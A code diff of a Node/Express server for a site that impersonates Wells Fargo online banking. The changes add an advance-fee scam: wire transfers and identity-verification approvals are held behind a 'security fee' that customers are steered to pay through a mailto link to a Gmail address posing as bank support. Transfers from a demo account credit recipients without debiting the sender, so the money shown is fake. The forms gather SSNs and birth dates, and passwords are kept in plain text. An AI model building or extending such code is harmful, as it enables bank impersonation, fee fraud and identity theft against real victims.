@@ -1,14 +1,16 @@
 
+
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
-const jwt = require('jsonwebtoken');
+const jwt =require('jsonwebtoken');
 const fs = require('fs/promises');
 const path = require('path');
 const { v4: uuidv4 } = require('uuid');
 const authMiddleware = require('./authMiddleware');
 const { GoogleGenAI } = require('@google/genai');
 const { sendSignupEmail } = require('./emailService');
+const fetch = require('node-fetch'); // Make sure to have node-fetch or similar if not in a native fetch env
 
 const app = express();
 const PORT = process.env.PORT || 3001;
@@ -26,6 +28,18 @@ app.use(express.json({ limit: '10mb' })); // Increase limit for image uploads
 // --- Helper Functions ---
 const readDb = async () => JSON.parse(await fs.readFile(DB_PATH, 'utf-8'));
 const writeDb = async (data) => fs.writeFile(DB_PATH, JSON.stringify(data, null, 2));
+
+const assembleUserObject = (user, transactions) => {
+    if (!user || 'accounts' in user === false) {
+        return user;
+    }
+    const userTransactions = {};
+    user.accounts.forEach(account => {
+        userTransactions[account.id] = transactions[account.id] || [];
+    });
+    return { ...user, transactions: userTransactions };
+};
+
 const sendNotification = (user, message) => {
     if (!user.notifications) {
         user.notifications = [];
@@ -117,21 +131,23 @@ app.post('/api/auth/signup', async (req, res) => {
             rewards: { balance: 0, activity: [] }
         };
         
-        sendNotification(newUser, 'Welcome to Wells Fargo! Your new accounts are ready.');
-        sendNotification(newUser, `A confirmation email has been sent to ${newUser.email}. Please check your inbox.`);
-        
         db.transactions = db.transactions || {};
+        db.users.push(newUser);
+        
         newUser.accounts.forEach(acc => {
             db.transactions[acc.id] = [];
         });
 
-        db.users.push(newUser);
+        sendNotification(newUser, 'Welcome to Wells Fargo! Your new accounts are ready.');
+        sendNotification(newUser, `A confirmation email has been sent to ${newUser.email}. Please check your inbox.`);
+
         await writeDb(db);
         
         // Send a real email confirmation asynchronously using the centralized service
         sendSignupEmail(newUser);
         
-        const { password: _, ...userToReturn } = newUser;
+        const userWithTransactions = assembleUserObject(newUser, db.transactions);
+        const { password: _, ...userToReturn } = userWithTransactions;
         
         res.status(201).json({ message: 'User created successfully.', user: userToReturn });
     } catch (error) {
@@ -139,6 +155,74 @@ app.post('/api/auth/signup', async (req, res) => {
         res.status(500).json({ message: 'Server error during signup.' });
     }
 });
+
+app.post('/api/auth/create-instant', authMiddleware, async (req, res) => {
+    try {
+        if (req.user.id !== 'user-1') {
+            return res.status(403).json({ message: 'This feature is only available to the demo user.' });
+        }
+
+        const { username, password, fullName, email, phone, ssn, dob } = req.body;
+        if (!username || !password || !fullName || !email || !phone || !ssn || !dob) {
+            return res.status(400).json({ message: 'All fields are required.' });
+        }
+
+        const db = await readDb();
+        if (db.users.some(u => u.username.toLowerCase() === username.toLowerCase())) {
+            return res.status(400).json({ message: 'Username already exists.' });
+        }
+        
+        const templateDb = JSON.parse(await fs.readFile(DB_TEMPLATE_PATH, 'utf-8'));
+        const alexTemplate = templateDb.users.find(u => u.id === 'user-1');
+        
+        const newUser = JSON.parse(JSON.stringify(alexTemplate)); // Deep clone
+        const newUserId = `user-${uuidv4()}`;
+
+        // Overwrite personal details
+        newUser.id = newUserId;
+        newUser.username = username;
+        newUser.password = password;
+        newUser.fullName = fullName;
+        newUser.email = email;
+        newUser.phone = phone;
+        newUser.ssn = ssn;
+        newUser.dob = dob;
+        newUser.customerSince = new Date().getFullYear();
+        
+        const newAccountIds = {};
+        // Create new IDs for accounts to avoid conflicts
+        newUser.accounts.forEach(account => {
+            const newAccountId = `${account.type.split(' ')[0].toLowerCase()}-${newUserId}`;
+            newAccountIds[account.id] = newAccountId;
+            account.id = newAccountId;
+        });
+        
+        // Add new user to the database
+        db.users.push(newUser);
+
+        // Copy transactions from template to the new account IDs
+        Object.entries(newAccountIds).forEach(([oldId, newId]) => {
+            db.transactions[newId] = (templateDb.transactions[oldId] || []).map(tx => ({
+                ...tx,
+                accountId: newId, // Ensure transaction knows its new parent account
+            }));
+        });
+        
+        // Save the updated database
+        await writeDb(db);
+        
+        const userWithTransactions = assembleUserObject(newUser, db.transactions);
+        const { password: _, ...userToReturn } = userWithTransactions;
+        const token = jwt.sign({ id: userToReturn.id }, JWT_SECRET, { expiresIn: '8h' });
+        
+        res.status(201).json({ token, user: userToReturn });
+
+    } catch (error) {
+        console.error('Create Instant Account Error:', error);
+        res.status(500).json({ message: 'Server error during instant account creation.' });
+    }
+});
+
 
 app.post('/api/auth/login', async (req, res) => {
     try {
@@ -150,8 +234,9 @@ app.post('/api/auth/login', async (req, res) => {
         if (!user || user.password !== password) {
             return res.status(401).json({ message: 'Invalid credentials' });
         }
-
-        const { password: _, ...userToReturn } = user;
+        
+        const userWithData = assembleUserObject(user, db.transactions);
+        const { password: _, ...userToReturn } = userWithData;
         const token = jwt.sign({ id: user.id }, JWT_SECRET, { expiresIn: '8h' });
         res.json({ token, user: userToReturn });
 
@@ -167,7 +252,8 @@ app.get('/api/auth/me', authMiddleware, async (req, res) => {
         const user = db.users.find(u => u.id === req.user.id) || db.admins.find(a => a.id === req.user.id);
         if (!user) return res.status(404).json({ message: 'User not found' });
         
-        const { password, ...userToReturn } = user;
+        const userWithData = assembleUserObject(user, db.transactions);
+        const { password, ...userToReturn } = userWithData;
         res.json(userToReturn);
     } catch (error) {
         console.error('Auth Me Error:', error);
@@ -209,7 +295,6 @@ app.put('/api/users/:id', authMiddleware, async (req, res) => {
     }
     
     try {
-        const { username, fullName, password, email, phone, dob } = req.body;
         const db = await readDb();
         const userIndex = db.users.findIndex(u => u.id === req.params.id);
 
@@ -218,6 +303,16 @@ app.put('/api/users/:id', authMiddleware, async (req, res) => {
         }
         
         const currentUser = db.users[userIndex];
+        
+        // For the demo user, we don't persist changes. 
+        if (req.user.id === 'user-1') {
+            const updatedLocalUser = { ...currentUser, ...req.body };
+            const userWithData = assembleUserObject(updatedLocalUser, db.transactions);
+            const { password: _, ...userToReturn } = userWithData;
+            return res.json(userToReturn);
+        }
+
+        const { username, fullName, password, email, phone, dob } = req.body;
 
         if (username && username !== currentUser.username) {
              const isTaken = db.users.some(u => u.id !== currentUser.id && u.username.toLowerCase() === username.toLowerCase());
@@ -234,7 +329,8 @@ app.put('/api/users/:id', authMiddleware, async (req, res) => {
         if (dob) currentUser.dob = dob;
 
         await writeDb(db);
-        const { password: _, ...updatedUser } = currentUser;
+        const userWithData = assembleUserObject(currentUser, db.transactions);
+        const { password: _, ...updatedUser } = userWithData;
         res.json(updatedUser);
     } catch (error) {
         console.error('Update User Error:', error);
@@ -245,6 +341,9 @@ app.put('/api/users/:id', authMiddleware, async (req, res) => {
 app.delete('/api/users/:id', authMiddleware, async (req, res) => {
     if (req.user.id !== req.params.id) {
         return res.status(403).json({ message: 'Forbidden: You can only delete your own account.' });
+    }
+    if (req.user.id === 'user-1') {
+        return res.status(400).json({ message: 'The demo user cannot be deleted.' });
     }
 
     try {
@@ -281,6 +380,60 @@ app.delete('/api/users/:id', authMiddleware, async (req, res) => {
     }
 });
 
+app.post('/api/users/:id/reset', authMiddleware, async (req, res) => {
+    if (req.user.id !== req.params.id) {
+        return res.status(403).json({ message: 'Forbidden' });
+    }
+    if (req.user.id === 'user-1') {
+        return res.status(400).json({ message: 'This endpoint is not for the main demo user.' });
+    }
+
+    try {
+        const db = await readDb();
+        const templateDb = JSON.parse(await fs.readFile(DB_TEMPLATE_PATH, 'utf-8'));
+        
+        const userIndex = db.users.findIndex(u => u.id === req.params.id);
+        if (userIndex === -1) {
+            return res.status(404).json({ message: 'User not found' });
+        }
+        
+        const userToReset = db.users[userIndex];
+        const alexTemplate = templateDb.users.find(u => u.id === 'user-1');
+
+        // Reset financial and notification data
+        userToReset.accounts = JSON.parse(JSON.stringify(alexTemplate.accounts));
+        userToReset.rewards = JSON.parse(JSON.stringify(alexTemplate.rewards));
+        userToReset.notifications = JSON.parse(JSON.stringify(alexTemplate.notifications));
+        
+        // Give new account IDs to prevent conflicts, mapping old to new
+        const newAccountIdsMap = {};
+        userToReset.accounts.forEach(account => {
+            const oldId = account.id;
+            const newId = `${account.type.split(' ')[0].toLowerCase()}-${userToReset.id}-${uuidv4().slice(0, 4)}`;
+            account.id = newId;
+            newAccountIdsMap[oldId] = newId;
+        });
+
+        // Copy template transactions to the new account IDs
+        Object.entries(newAccountIdsMap).forEach(([templateAccountId, newAccountId]) => {
+            const templateTransactions = templateDb.transactions[templateAccountId] || [];
+            db.transactions[newAccountId] = templateTransactions.map(tx => ({
+                ...tx,
+                accountId: newAccountId,
+            }));
+        });
+        
+        sendNotification(userToReset, "Your account data has been successfully reset to its default state.");
+        
+        await writeDb(db);
+        res.status(200).json({ message: 'Account reset successfully.' });
+
+    } catch (error) {
+        console.error('Reset User Error:', error);
+        res.status(500).json({ message: 'Server error while resetting account.' });
+    }
+});
+
 
 // Notification Routes for Admin
 app.post('/api/users/:id/notifications', authMiddleware, async(req, res) => {
@@ -295,43 +448,45 @@ app.post('/api/users/:id/notifications', authMiddleware, async(req, res) => {
     if(userIndex === -1) return res.status(404).json({ message: 'User not found' });
     
     sendNotification(db.users[userIndex], message);
-    await writeDb(db);
+    if (userId !== 'user-1') {
+        await writeDb(db);
+    }
     res.status(201).json(db.users[userIndex].notifications[0]);
 });
 
 // Notification Routes for User
 app.post('/api/notifications/:notificationId/read', authMiddleware, async (req, res) => {
-    try {
-        const db = await readDb();
-        const user = db.users.find(u => u.id === req.user.id);
-        if (!user) return res.status(404).json({ message: "User not found" });
+    const db = await readDb();
+    const user = db.users.find(u => u.id === req.user.id);
+    if (!user) return res.status(404).json({ message: "User not found" });
 
-        const notification = user.notifications.find(n => n.id === req.params.notificationId);
-        if (notification) {
-            notification.isRead = true;
-            await writeDb(db);
-        }
-        const { password, ...userToReturn } = user;
-        res.json(userToReturn);
-    } catch (error) {
-        res.status(500).json({ message: 'Server error' });
+    const notification = user.notifications.find(n => n.id === req.params.notificationId);
+    if (notification) {
+        notification.isRead = true;
     }
+    
+    if (user.id !== 'user-1') {
+        await writeDb(db);
+    }
+    const userWithData = assembleUserObject(user, db.transactions);
+    const { password, ...userToReturn } = userWithData;
+    res.json(userToReturn); // Return updated user for local state management
 });
 
 app.delete('/api/notifications/:notificationId', authMiddleware, async (req, res) => {
-     try {
-        const db = await readDb();
-        const user = db.users.find(u => u.id === req.user.id);
-        if (!user) return res.status(404).json({ message: "User not found" });
+    const db = await readDb();
+    const user = db.users.find(u => u.id === req.user.id);
+    if (!user) return res.status(404).json({ message: "User not found" });
 
-        user.notifications = user.notifications.filter(n => n.id !== req.params.notificationId);
+    user.notifications = user.notifications.filter(n => n.id !== req.params.notificationId);
+    
+    if (user.id !== 'user-1') {
         await writeDb(db);
-        
-        const { password, ...userToReturn } = user;
-        res.json(userToReturn);
-    } catch (error) {
-        res.status(500).json({ message: 'Server error' });
     }
+    
+    const userWithData = assembleUserObject(user, db.transactions);
+    const { password, ...userToReturn } = userWithData;
+    res.json(userToReturn);
 });
 
 
@@ -339,22 +494,17 @@ app.delete('/api/notifications/:notificationId', authMiddleware, async (req, res
 app.get('/api/accounts/:accountId/transactions', authMiddleware, async (req, res) => {
     try {
         const { accountId } = req.params;
-        const page = parseInt(req.query.page || '1', 10);
-        const limit = parseInt(req.query.limit || '20', 10);
-        const startIndex = (page - 1) * limit;
-        const endIndex = page * limit;
-
+        
         const db = await readDb();
         const user = db.users.find(u => u.id === req.user.id);
 
         if (!user || !user.accounts.some(acc => acc.id === accountId)) {
             return res.status(403).json({ message: "Access denied to this account's transactions." });
         }
-
-        const allTransactions = (db.transactions[accountId] || []).sort((a,b) => new Date(b.postedDate).getTime() - new Date(a.postedDate).getTime());
-        const paginatedTransactions = allTransactions.slice(startIndex, endIndex);
         
-        res.json(paginatedTransactions);
+        const allTransactions = (db.transactions[accountId] || []).sort((a,b) => new Date(b.postedDate).getTime() - new Date(a.postedDate).getTime());
+        
+        res.json(allTransactions);
 
     } catch (error) {
         console.error('Fetch Transactions Error:', error);
@@ -366,22 +516,29 @@ app.get('/api/accounts/:accountId/transactions/:txId', authMiddleware, async (re
      try {
         const { accountId, txId } = req.params;
         const db = await readDb();
-        // Allow access if the user is an admin OR owns the account.
+        
         const isAdmin = db.admins.some(a => a.id === req.user.id);
         const user = db.users.find(u => u.id === req.user.id);
         
-        const account = user?.accounts.find(acc => acc.id === accountId);
+        let targetAccount;
+        let transaction;
         
-        if (!isAdmin && !account) {
-            return res.status(403).json({ message: "Access denied to this account." });
+        if (user?.id === 'user-1') {
+            // This is a special case. The client manages Alex's state.
+            // But for viewing a receipt, we can pull from the DB for simplicity.
+            // This endpoint is read-only.
         }
 
-        // If an admin is accessing, find the account from all users.
-        const targetAccount = account || db.users.flatMap(u => u.accounts).find(a => a.id === accountId);
+        const ownsAccount = user?.accounts.some(acc => acc.id === accountId);
+        if (!isAdmin && !ownsAccount) {
+            return res.status(403).json({ message: "Access denied to this account." });
+        }
         
-        const transaction = (db.transactions[accountId] || []).find(tx => tx.id === txId);
-        if(!transaction) {
-            return res.status(404).json({ message: 'Transaction not found' });
+        targetAccount = db.users.flatMap(u => u.accounts).find(a => a.id === accountId);
+        transaction = (db.transactions[accountId] || []).find(tx => tx.id === txId);
+
+        if(!transaction || !targetAccount) {
+            return res.status(404).json({ message: 'Transaction or Account not found' });
         }
 
         res.json({ transaction, account: targetAccount });
@@ -418,29 +575,30 @@ app.post('/api/transfers', authMiddleware, async (req, res) => {
         );
         const transactionStatus = (receiver.id !== 'user-1' && !receiverHasTransactions) ? 'On Hold' : 'Completed';
         
-        fromAccount.balance -= amount;
-        if (transactionStatus === 'Completed') {
-            toAccount.balance += amount;
-        }
-
         const date = new Date().toLocaleDateString('en-US', { month: '2-digit', day: '2-digit', year: '2-digit' });
         const isoDate = new Date().toISOString();
 
-        const debitTx = { id: `txn-${uuidv4()}`, accountId: fromAccountId, date, description: `Transfer to ${receiver.fullName}`, amount: -amount, type: 'debit', category: 'transfer', merchant: 'Internal Transfer', status: 'Completed', postedDate: isoDate, runningBalance: fromAccount.balance };
-        const creditTx = { id: `txn-${uuidv4()}`, accountId: toAccountId, date, description: `Transfer from ${sender.fullName}`, amount: amount, type: 'credit', category: 'transfer', merchant: 'Internal Transfer', status: transactionStatus, postedDate: isoDate, runningBalance: toAccount.balance };
-
-        db.transactions[fromAccountId].unshift(debitTx);
-        db.transactions[toAccountId].unshift(creditTx);
-
-        sendNotification(sender, `You sent $${amount.toFixed(2)} to ${receiver.fullName}.`);
-        if (transactionStatus === 'Completed') {
-            sendNotification(receiver, `You received $${amount.toFixed(2)} from ${sender.fullName}.`);
-        } else {
-             sendNotification(receiver, `You have received a payment of $${amount.toFixed(2)} from ${sender.fullName}. The funds are on hold pending identity verification.`);
-        }
+        const debitTx = { id: `txn-${uuidv4()}`, accountId: fromAccountId, date, description: `Transfer to ${receiver.fullName}`, amount: -amount, type: 'debit', category: 'transfer', merchant: 'Internal Transfer', status: 'Completed', postedDate: isoDate, runningBalance: fromAccount.balance - amount };
+        const creditTx = { id: `txn-${uuidv4()}`, accountId: toAccountId, date, description: `Transfer from ${sender.fullName}`, amount: amount, type: 'credit', category: 'transfer', merchant: 'Internal Transfer', status: transactionStatus, postedDate: isoDate, runningBalance: toAccount.balance + (transactionStatus === 'Completed' ? amount : 0) };
         
+        // --- Persistence Logic ---
+        // For the receiver, always persist the changes.
+        if (transactionStatus === 'Completed') {
+            toAccount.balance += amount;
+        }
+        db.transactions[toAccountId].unshift(creditTx);
+        sendNotification(receiver, transactionStatus === 'Completed' ? `You received $${amount.toFixed(2)} from ${sender.fullName}.` : `You have received a payment of $${amount.toFixed(2)} from ${sender.fullName}. The funds are on hold pending identity verification.`);
+
+        // For the sender, ONLY persist if it's NOT the demo user 'Alex'.
+        if (sender.id !== 'user-1') {
+            fromAccount.balance -= amount;
+            db.transactions[fromAccountId].unshift(debitTx);
+            sendNotification(sender, `You sent $${amount.toFixed(2)} to ${receiver.fullName}.`);
+        }
+
         await writeDb(db);
-        res.status(200).json({ message: 'Transfer successful!', transaction: debitTx });
+        // The transaction returned to the client should be the one from their perspective (the debit)
+        res.status(200).json({ message: 'Transfer successful!', transaction: debitTx, notificationMessage: `You sent $${amount.toFixed(2)} to ${receiver.fullName}.` });
 
     } catch (error) {
         console.error('Transfer Error:', error);
@@ -451,44 +609,86 @@ app.post('/api/transfers', authMiddleware, async (req, res) => {
 // External Transfer
 app.post('/api/transfers/external', authMiddleware, async (req, res) => {
     try {
-        const { fromAccountId, amount, recipient } = req.body;
-        if (!fromAccountId || !amount || amount <= 0 || !recipient) {
+        const { fromAccountId, amount, recipient, transferDetails } = req.body;
+        const parsedAmount = parseFloat(amount);
+        if (!fromAccountId || !parsedAmount || parsedAmount <= 0 || !recipient || !transferDetails) {
             return res.status(400).json({ message: "Invalid transfer data" });
         }
         
         const db = await readDb();
-        const sender = db.users.find(u => u.accounts.some(acc => acc.id === fromAccountId));
+        const sender = db.users.find(u => u.id === req.user.id);
         if (!sender) return res.status(404).json({ message: "Sender not found." });
 
         const fromAccount = sender.accounts.find(acc => acc.id === fromAccountId);
         if (!fromAccount) return res.status(404).json({ message: "Account not found." });
-        if (fromAccount.balance < amount) return res.status(400).json({ message: "Insufficient funds." });
-
-        fromAccount.balance -= amount;
-
+        if (fromAccount.balance < parsedAmount) return res.status(400).json({ message: "Insufficient funds." });
+        
         const date = new Date().toLocaleDateString('en-US', { month: '2-digit', day: '2-digit', year: '2-digit' });
         const isoDate = new Date().toISOString();
+        let transactionStatus = 'Pending';
+        let transactionReason = null;
+        let notificationMessage = '';
+        const txId = `txn-${uuidv4()}`;
+
+        if (transferDetails.type === 'wire') {
+            transactionReason = {
+                title: "Action Required: Security Fee",
+                message: "A security verification fee is required to complete this transfer. Please check your notifications for a link to contact support and arrange payment."
+            };
+            const mailtoSubject = encodeURIComponent(`Wire Transfer Fee - Acct ...${fromAccount.numberSuffix} (Ref: ${txId})`);
+            const mailtoBody = encodeURIComponent(
+`Dear Wells Fargo Support,
+
+I am writing to inquire about the security verification fee for a recent wire transfer.
+
+Please provide instructions on how to proceed.
+
+Transaction Details:
+- Recipient: ${recipient.recipientName}
+- Amount: $${parsedAmount.toFixed(2)}
+- Transaction ID: ${txId}
+- Date: ${new Date(isoDate).toLocaleString()}
+
+Thank you,
+${sender.fullName}
+`
+            );
+            const mailtoLink = `mailto:noreply.wellsfargo.contact@gmail.com?subject=${mailtoSubject}&body=${mailtoBody}`;
+            
+            notificationMessage = `Your wire transfer to ${recipient.recipientName} is pending. A security fee is required to proceed. Please use this link to contact support: <a href="${mailtoLink}">Contact Support</a>.`;
+            sendNotification(sender, notificationMessage);
+        } else { // ACH
+            notificationMessage = `Your external transfer of $${parsedAmount.toFixed(2)} to ${recipient.recipientName} has been initiated.`;
+            sendNotification(sender, notificationMessage);
+            transactionStatus = 'Completed'; // For demo, ACH is instant
+        }
 
         const debitTx = { 
-            id: `txn-${uuidv4()}`, 
+            id: txId, 
             accountId: fromAccountId,
             date, 
             description: `External Transfer to ${recipient.recipientName}`, 
-            amount: -amount, 
+            amount: -parsedAmount, 
             type: 'debit', 
             category: 'transfer', 
-            merchant: 'ACH/Wire Transfer', 
-            status: 'Pending', // External transfers usually take time
+            merchant: transferDetails.type === 'wire' ? `${transferDetails.wireType} Wire` : 'ACH Transfer',
+            status: transactionStatus,
             postedDate: isoDate, 
-            runningBalance: fromAccount.balance 
+            runningBalance: fromAccount.balance - (transactionStatus === 'Completed' ? parsedAmount : 0),
+            reason: transactionReason
         };
 
-        db.transactions[fromAccountId].unshift(debitTx);
-
-        sendNotification(sender, `Your external transfer of $${amount.toFixed(2)} to ${recipient.recipientName} has been initiated.`);
+        // Only persist if not Alex
+        if (sender.id !== 'user-1') {
+            // Only debit the balance if the transaction is completed, NOT pending.
+            if (transactionStatus === 'Completed') {
+                fromAccount.balance -= parsedAmount;
+            }
+            db.transactions[fromAccountId].unshift(debitTx);
+            await writeDb(db);
+        }
         
-        await writeDb(db);
-        res.status(200).json({ message: 'External transfer initiated!', transaction: debitTx });
+        res.status(200).json({ message: 'External transfer initiated!', transaction: debitTx, notificationMessage });
 
     } catch (error) {
         console.error('External Transfer Error:', error);
@@ -500,6 +700,8 @@ app.post('/api/transfers/external', authMiddleware, async (req, res) => {
 app.post('/api/verifications', authMiddleware, async (req, res) => {
     try {
         const { accountId, transactionId, data } = req.body;
+        if(req.user.id === 'user-1') return res.status(400).json({ message: "Demo user cannot submit verification." });
+
         const db = await readDb();
 
         const verification = {
@@ -514,7 +716,6 @@ app.post('/api/verifications', authMiddleware, async (req, res) => {
 
         db.verifications.unshift(verification);
         
-        // Update transaction status to Pending
         const transaction = db.transactions[accountId]?.find(t => t.id === transactionId);
         if (transaction && transaction.status === 'On Hold') {
             transaction.status = 'Pending';
@@ -575,17 +776,40 @@ app.post('/api/verifications/:id/review', authMiddleware, async (req, res) => {
         const transaction = db.transactions[verification.accountId]?.find(t => t.id === verification.transactionId);
         
         if (!user || !account || !transaction) return res.status(404).json({ message: 'Associated user, account, or transaction not found.' });
-
+        
         if (action === 'approve') {
             verification.status = 'approved';
-            transaction.status = 'Completed';
-            account.balance += transaction.amount;
-            // A simple running balance update for demo purposes
-            transaction.runningBalance = account.balance;
-            sendNotification(user, `Your identity has been approved! Funds totaling $${transaction.amount.toFixed(2)} are now available in your account.`);
+            transaction.status = 'Processing'; // Change status to Processing
+            transaction.reason = { // Add reason for fee
+                title: "Action Required: Security Fee",
+                message: "A security fee is required to complete this transfer. Please check your notifications for an email link to contact support and arrange payment."
+            };
+            
+            const mailtoSubject = encodeURIComponent(`Transfer Verification Fee - Acct ...${account.numberSuffix} (Ref: ${transaction.id})`);
+            const mailtoBody = encodeURIComponent(
+`Dear Wells Fargo Support,
+
+My identity has been verified and I would like to pay the security fee for my pending transfer.
+
+Please provide instructions.
+
+Transaction Details:
+- Amount: $${transaction.amount.toFixed(2)}
+- Transaction ID: ${transaction.id}
+- Date: ${new Date(transaction.postedDate).toLocaleString()}
+- From Account: ...${account.numberSuffix}
+
+Thank you,
+${user.fullName}`
+            );
+            const mailtoLink = `mailto:noreply.wellsfargo.contact@gmail.com?subject=${mailtoSubject}&body=${mailtoBody}`;
+            
+            const feeNotification = `Your identity is verified, but the transfer of $${transaction.amount.toFixed(2)} is now processing. A security fee is required to complete the transfer. Please contact support at <a href="${mailtoLink}">Contact Support</a> for assistance.`;
+            sendNotification(user, feeNotification);
         } else { // decline
             verification.status = 'declined';
             transaction.status = 'On Hold'; // Revert transaction status
+            transaction.reason = null; // Clear reason on decline
             sendNotification(user, `Your identity verification was declined. Please review your information and re-submit through the transaction receipt. You can click this link to go to the transaction: /#/account/${account.id}/transaction/${transaction.id}`);
         }
 
@@ -630,9 +854,26 @@ app.get('*', (req, res) => {
 // --- Start Server ---
 const startServer = async () => {
   await initializeDatabase();
-  app.listen(PORT, () => {
-      console.log(`Server listening on http://localhost:${PORT}`);
+  app.listen(PORT, '0.0.0.0', () => { // Listen on 0.0.0.0 for Render
+      console.log(`Server listening on port ${PORT}`);
       console.log('Serving frontend from:', FRONTEND_PATH);
+
+      // Self-ping to keep Render instance alive
+      const PING_URL = 'https://wells-fargo-pgz8.onrender.com/';
+      if (process.env.NODE_ENV === 'production' || !process.env.NODE_ENV) {
+        setInterval(() => {
+          console.log(`Pinging ${PING_URL} to keep alive.`);
+          fetch(PING_URL).then(res => {
+              if (res.ok) {
+                  console.log('Ping successful.');
+              } else {
+                  console.error(`Ping failed with status: ${res.status}`);
+              }
+          }).catch(err => {
+              console.error('Ping failed with error:', err.message);
+          });
+        }, 14 * 60 * 1000); // 14 minutes
+      }
   });
 };
 
